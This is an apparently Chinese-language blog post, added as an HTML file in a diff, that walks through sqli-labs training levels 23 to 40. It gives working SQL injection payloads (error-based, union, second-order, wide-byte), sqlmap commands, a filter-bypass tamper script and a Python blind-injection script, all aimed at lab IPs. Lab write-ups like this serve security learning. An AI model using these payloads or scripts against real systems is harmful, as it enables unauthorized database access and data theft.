@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>sql注入第三弹 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="一、sqli-labes靶场 1.第二十三关 输入?id&#x3D;1’出现报错，尝试使用– -注释后面的内容，发现注释符被过滤掉了  试试加上and ‘1’&#x3D;’1成功显示，and ‘1’&#x3D;’2没有显示，那么闭合点就是单引号 输入?id&#x3D;1’ or updatexml(1,concat(0x7e,(select database()),0x7e),1) and ‘1’">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入第三弹">
+<meta property="og:url" content="http://example.com/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E5%BC%B9/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、sqli-labes靶场 1.第二十三关 输入?id&#x3D;1’出现报错，尝试使用– -注释后面的内容，发现注释符被过滤掉了  试试加上and ‘1’&#x3D;’1成功显示，and ‘1’&#x3D;’2没有显示，那么闭合点就是单引号 输入?id&#x3D;1’ or updatexml(1,concat(0x7e,(select database()),0x7e),1) and ‘1’">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703642023267-f6a688c9-5ad2-4651-9085-834dcef7654b-170463140159432.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703641916670-4eab7d52-2521-47b4-9325-9879be69a88d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703643885571-290833a5-c04d-4953-bd98-a7fa46e9476b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703643937374-243ef784-4048-4d90-9829-03d14da881ad.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703644179077-6f419c3a-1835-49b8-889c-1bd39694d0d6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703644255670-1154d896-a97d-498f-973f-59b9ecf558c5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703644117963-03e025d0-66f3-430f-9790-971e025cb050.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703645712417-c06ea279-b0ff-4278-a8ae-e03f1773fe7d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38965110/1703646359337-9a5a6089-817d-488c-85c1-49ddcb90f831.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703646874115-a9f6dc8d-a179-4c94-b4e9-9a692494a9cb.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703646919642-44fe0a58-4504-45a4-b651-faec6e88f327.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703675473045-dbb5ba2d-71ca-44c4-95d5-4c93196a16e4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703648212152-e3aebb4a-9cc9-49de-af1a-33544318ee62.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703675624388-2098485e-d200-48ae-8439-108d2e04aa3b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703658858380-aac63f55-d0e4-4cbc-a00e-a10039f269ce.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703675794262-b3ce3a6e-b553-4858-a8e1-a6c04395e7d1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703676050386-a588972a-21e6-4125-b800-061fbf248269.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703676402180-0fb91f03-bdaf-49c9-ae4f-3742c0fb654d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703676541929-5b75b74b-8ab7-4802-a3fc-263fc703fdc7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703676772170-abc6a323-b2a9-4825-ac08-6b344e852139.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703677152289-fe572397-483c-4810-8fb4-49e524da565c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703678728286-afabc790-92d9-44d5-8c57-0f6fb44a03bb.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703678995749-d708bdcb-54f4-40a5-bc13-997ec6b8f680.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703679853773-57a00543-6851-4929-a415-a4077cd70edd.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703680407946-d0ea2225-3208-45fa-aea9-18340ed3cfd6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38965110/1703680383699-60022d4b-4b6c-4bc7-ba4b-6fa51c4f896f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703681296786-97813de2-0a7a-48e6-b898-6fa0c9c69fba.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703681391020-487e8c7f-ccee-4426-baf1-2cd05f346449.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703681463026-df9e0b34-ddcd-4b50-b009-03fbf72b37fa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703681631382-bfcc6f1a-95cb-4e73-9e62-175eff39932a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703681729159-f972c7ff-dd58-484b-9103-0c4024e3c82b.png">
+<meta property="article:published_time" content="2024-01-07T12:41:33.000Z">
+<meta property="article:modified_time" content="2024-01-07T12:57:02.520Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703642023267-f6a688c9-5ad2-4651-9085-834dcef7654b-170463140159432.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/default-avatar.jpg">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/highlight.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" title="图片来自网络">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/archives" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-sql注入第三弹" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入第三弹
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E5%BC%B9/" class="article-date">
+  <time datetime="2024-01-07T12:41:33.000Z" itemprop="datePublished">2024-01-07</time>
+</a>
+    
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>一、sqli-labes靶场</p>
+<p>1.第二十三关</p>
+<p>输入?id&#x3D;1’出现报错，尝试使用– -注释后面的内容，发现注释符被过滤掉了</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703642023267-f6a688c9-5ad2-4651-9085-834dcef7654b-170463140159432.png" alt="img"></p>
+<p>试试加上and ‘1’&#x3D;’1成功显示，and ‘1’&#x3D;’2没有显示，那么闭合点就是单引号</p>
+<p>输入?id&#x3D;1’ or updatexml(1,concat(0x7e,(select database()),0x7e),1) and ‘1’&#x3D;’1成功显示数据库名</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703641916670-4eab7d52-2521-47b4-9325-9879be69a88d.png" alt="img"></p>
+<p>2.二十四关</p>
+<p>这一关是二次注入原理</p>
+<p>先点击注册账号</p>
+<p>用户名为admin’ # 密码为123然后register</p>
+<p>然后用注册好的用户登录进去再修改密码</p>
+<p>用户名admin’ # 密码123456然后reset</p>
+<p>返回登录页面用admin	admin登录发现登录失败</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703643885571-290833a5-c04d-4953-bd98-a7fa46e9476b.png" alt="img"></p>
+<p>然后用admin	123456可以登录成功</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703643937374-243ef784-4048-4d90-9829-03d14da881ad.png" alt="img"></p>
+<p>3.二十五关</p>
+<p>?id&#x3D;1’ 出现报错,加上注释回显成功</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703644179077-6f419c3a-1835-49b8-889c-1bd39694d0d6.png" alt="img"></p>
+<p>?id&#x3D;1’ order by 3 – -测一下字段发现报错，根据提示信息得知or被过滤掉了</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703644255670-1154d896-a97d-498f-973f-59b9ecf558c5.png" alt="img"></p>
+<p>尝试一下报错注入，把or换成||</p>
+<p>?id&#x3D;1’ || updatexml(1,concat(0x7e,(select database()),0x7e),1) – -成功爆出数据库</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703644117963-03e025d0-66f3-430f-9790-971e025cb050.png" alt="img"></p>
+<p>4.25a关</p>
+<p>（1）第一种</p>
+<p>?id&#x3D;1是闭合点</p>
+<p>使用联合注入爆出库名</p>
+<p>?id&#x3D;-1 union select 1,2,database() – -</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703645712417-c06ea279-b0ff-4278-a8ae-e03f1773fe7d.png" alt="img"></p>
+<p>（2）第二种</p>
+<p>用sqlmap去跑</p>
+<p>sqlmap  -u “<a target="_blank" rel="noopener" href="http://192.168.2.51/sqli/Less-25a/?id=1">http://192.168.2.51/sqli/Less-25a/?id=1</a>“  –batch -D security -T users -C “id,username” –dump</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38965110/1703646359337-9a5a6089-817d-488c-85c1-49ddcb90f831.png" alt="img"></p>
+<p>5.26关</p>
+<p>（1）第一种</p>
+<p>?id&#x3D;1’是闭合点</p>
+<p>查看源码发现过滤了很多内容</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703646874115-a9f6dc8d-a179-4c94-b4e9-9a692494a9cb.png" alt="img"></p>
+<p>?id&#x3D;-1’||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||’1’&#x3D;’1</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703646919642-44fe0a58-4504-45a4-b651-faec6e88f327.png" alt="img"></p>
+<p>（2）第二种</p>
+<p>在kali   usr&#x2F;share&#x2F;sqlmap&#x2F;tamper目录中创建一个python文件，内容如下</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;or&#x27;</span> , <span class="string">&#x27;oorr&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;and&#x27;</span> , <span class="string">&#x27;anandd&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27; &#x27;</span> , <span class="string">&#x27;%0B&#x27;</span>)</span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>
+
+<p>在终端输入</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.84/sqli/Less-26/?id=1">http://192.168.2.84/sqli/Less-26/?id=1</a>“ -v 3 –tamper&#x3D;2 –dbs –batch</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703675473045-dbb5ba2d-71ca-44c4-95d5-4c93196a16e4.png" alt="img"></p>
+<p>6.26a关</p>
+<p>（1）</p>
+<p>用脚本进行盲注</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.51/sqli/Less-26a/?id=0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_2</span>():</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">127</span></span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> start &lt;= end:</span><br><span class="line">            <span class="comment"># 假设正确的成功条件是URL返回一个特定的字符串</span></span><br><span class="line">            payload = url + <span class="string">f&quot;&#x27;||ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>||&#x27;&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(payload)  <span class="comment"># 如果你想看实际发送的payload，可以将这行取消注释</span></span><br><span class="line">            response = session.get(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Your Login name&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                start = mid + <span class="number">1</span></span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid - <span class="number">1</span></span><br><span class="line">                mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> start &gt; <span class="number">127</span> <span class="keyword">or</span> mid == <span class="number">32</span>:  <span class="comment"># 如果start大于ASCII字符的上限，则停止</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(start)  <span class="comment"># 最后找到ASCII字符应该是start或end，因为它们会汇合</span></span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">db_2()</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703648212152-e3aebb4a-9cc9-49de-af1a-33544318ee62.png" alt="img"></p>
+<p>（2）</p>
+<p>跟26关一样</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.2.84/sqli/Less-26a/?id=1">http://192.168.2.84/sqli/Less-26a/?id=1</a>“ -v 3 –tamper&#x3D;2 –dbs –batch</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703675624388-2098485e-d200-48ae-8439-108d2e04aa3b.png" alt="img"></p>
+<p>7.27关</p>
+<p>跟上一关一样可以使用脚本</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703658858380-aac63f55-d0e4-4cbc-a00e-a10039f269ce.png" alt="img"></p>
+<p>8.27a关</p>
+<p>和二十七关一样用脚本</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703675794262-b3ce3a6e-b553-4858-a8e1-a6c04395e7d1.png" alt="img"></p>
+<p>9.28关</p>
+<p>也可以用脚本跑完</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703676050386-a588972a-21e6-4125-b800-061fbf248269.png" alt="img"></p>
+<p>10.28a关</p>
+<p>照样用脚本跑完</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703676402180-0fb91f03-bdaf-49c9-ae4f-3742c0fb654d.png" alt="img"></p>
+<p>11.29关</p>
+<p>这个跟第一关一样</p>
+<p>?id&#x3D;1’是闭合点</p>
+<p>?id&#x3D;-1’ union select 1,user(),database() – - </p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703676541929-5b75b74b-8ab7-4802-a3fc-263fc703fdc7.png" alt="img"></p>
+<p>12.30关</p>
+<p>?id&#x3D;1” 是闭合点</p>
+<p>?id&#x3D;-1” union select 1,user(),database() – - </p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703676772170-abc6a323-b2a9-4825-ac08-6b344e852139.png" alt="img"></p>
+<p>13.31关</p>
+<p>?id&#x3D;1”)是闭合点</p>
+<p>?id&#x3D;-1”)%20 union select 1,user(),database() – -</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703677152289-fe572397-483c-4810-8fb4-49e524da565c.png" alt="img"></p>
+<p>14.32关</p>
+<p>这一关是宽字节注入</p>
+<p>输入?id&#x3D;1’发现单引号被转义了,在单引号前面加%df</p>
+<p>?id&#x3D;1%df’ and 1&#x3D;1–+  </p>
+<p>?id&#x3D;-1%df%27%20union%20select%201,user(),database()%20–+</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703678728286-afabc790-92d9-44d5-8c57-0f6fb44a03bb.png" alt="img"></p>
+<p>15.33关</p>
+<p>和三十二关一样</p>
+<p>?id&#x3D;1%df’</p>
+<p>?id&#x3D;-1%df%27union%20select%201,user(),database()–+</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703678995749-d708bdcb-54f4-40a5-bc13-997ec6b8f680.png" alt="img"></p>
+<p>16.34关</p>
+<p>使用上一关的%df发现也没效果，因为post提交不能使用url编码，所以用上汉字</p>
+<p>username：汉’ or updatexml(1,concat(0x7e,database(),0x7e),1)– -</p>
+<p>password：admin</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703679853773-57a00543-6851-4929-a415-a4077cd70edd.png" alt="img"></p>
+<p>17.35关</p>
+<p>测试半天才发现是个数字型注入</p>
+<p>?id&#x3D;1 and 1&#x3D;2 – -</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703680407946-d0ea2225-3208-45fa-aea9-18340ed3cfd6.png" alt="img"></p>
+<p>?id&#x3D;-1 union select 1,user(),database() – -</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38965110/1703680383699-60022d4b-4b6c-4bc7-ba4b-6fa51c4f896f.png" alt="img"></p>
+<p>18.36关</p>
+<p>仍然是宽字节注入</p>
+<p>?id&#x3D;1%df’ and 1&#x3D;2–+ 报错，闭合点依然是单引号</p>
+<p>?id&#x3D;-1%df%27%20union%20select%201,user(),database()%20–+</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703681296786-97813de2-0a7a-48e6-b898-6fa0c9c69fba.png" alt="img"></p>
+<p>19.37关</p>
+<p>和三十四关一样</p>
+<p>username：汉’ or updatexml(1,concat(0x7e,database(),0x7e),1)– -</p>
+<p>password：admin</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703681391020-487e8c7f-ccee-4426-baf1-2cd05f346449.png" alt="img"></p>
+<p>20.38关</p>
+<p>也是和第一关一样</p>
+<p>?id&#x3D;-1’ union select 1,user(),database() – -</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703681463026-df9e0b34-ddcd-4b50-b009-03fbf72b37fa.png" alt="img"></p>
+<p>21.39关</p>
+<p>?id&#x3D;1是闭合点</p>
+<p>?id&#x3D;-1 union select 1,user(),database() – -</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703681631382-bfcc6f1a-95cb-4e73-9e62-175eff39932a.png" alt="img"></p>
+<p>22.40关</p>
+<p>?id&#x3D;1’)是闭合点</p>
+<p>?id&#x3D;-1’) union select 1,user(),database() – -</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703681729159-f972c7ff-dd58-484b-9103-0c4024e3c82b.png" alt="img"></p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+      <a href="/2024/01/07/moneybox%E9%9D%B6%E6%9C%BA/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption"></strong>
+        <div class="article-nav-title">
+          
+            moneybox靶机
+          
+        </div>
+      </a>
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%BA%8C%E5%BC%B9%EF%BC%88sqlmap%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">sql注入第二弹（sqlmap）</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    <link rel="stylesheet" href="/css/gitment.css"> 
+<script src="/js/gitment.js"></script>
+
+<div id="gitmentContainer"></div>
+
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
+    <h3 class="avatar-name">
+      
+        渗透不了一点
+      
+    </h3>
+    <p class="avatar-slogan">
+      缘分落地生根是我们。
+    </p>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/1/" rel="tag">1</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/1/" style="font-size: 10px;">1</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/07/moneybox%E9%9D%B6%E6%9C%BA/">moneybox靶机</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E5%BC%B9/">sql注入第三弹</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%BA%8C%E5%BC%B9%EF%BC%88sqlmap%EF%BC%89/">sql注入第二弹（sqlmap）</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%80%E5%BC%B9/">sql注入第一弹</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/25/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB/">前后端分离</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+        <a style="display: block;" href="https://yiluyanxia.github.io/" title target='_blank'
+        >一路眼瞎</a>
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2024 John Doe &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a target="_blank" rel="noopener" href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/archives" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
